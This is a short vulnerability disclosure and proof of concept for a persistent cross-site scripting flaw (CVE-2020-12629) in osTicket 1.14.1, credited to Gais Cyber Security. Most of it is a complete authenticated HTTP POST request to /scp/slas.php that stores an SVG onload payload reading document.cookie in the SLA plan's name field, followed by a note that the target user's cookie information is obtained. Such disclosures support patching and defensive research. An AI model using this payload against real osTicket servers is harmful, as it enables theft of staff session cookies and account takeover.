Title: osTicket 1.14.1 - Persistent Authenticated Cross-Site Scripting <br>
Author: Mehmet Kelepce / Gais Cyber Security <br>
Date : 2020-03-24 <br>
Source Link: https://github.com/osticket/osticket/commit/fc4c8608fa122f38673b9dddcb8fef4a15a9c884 <br>
CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12629 <br>
Exploit-Db : https://www.exploit-db.com/exploits/48413  <br>
Vendor: http://osticket.com <br>
Remotely Exploitable: Yes <br>
Dynamic Coding Language: PHP <br>
CVSSv3 Base Score: 7.4 (AV:N, AC:L, PR:L, UI:N, S:C, C:L, I:L, A:L) <br>
<br>
this vulnerability was found by examining the source code.<br>
<br>
PoC : Ticket SLA Plan Name - HTTP POST REQUEST<br>
-----<br>
POST /upload/scp/slas.php?id=1 HTTP/1.1<br>
Host: localhost<br>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>
Accept-Language: en-US,en;q=0.5<br>
Accept-Encoding: gzip, deflate<br>
Referer: http://localhost/upload/scp/slas.php?id=1<br>
Content-Type: application/x-www-form-urlencoded<br>
Content-Length: 196<br>
Connection: close<br>
Cookie: cookie=3333; OSTSESSID=684d6hn7dfk869kupbhc9hq2qv<br>
Upgrade-Insecure-Requests: 1<br>
<br>
submit=Save+Changes&__CSRFToken__=6174a3343a6277b2e5faae240188d54624a756d7&do=update&a=&id=1&name=%3Csvg+onload%3Dconfirm%28document.cookie%29%3B%3E&isactive=1&grace_period=48&schedule_id=0&notes=<br>
<br>
Vulnerable parameter: name<br>
Parameter file: /scp/slass.php<br>
<br>
I used the name of the SLA for any ticket.<br>
<br>
Risk : cookie information of the target user is obtained.<br>

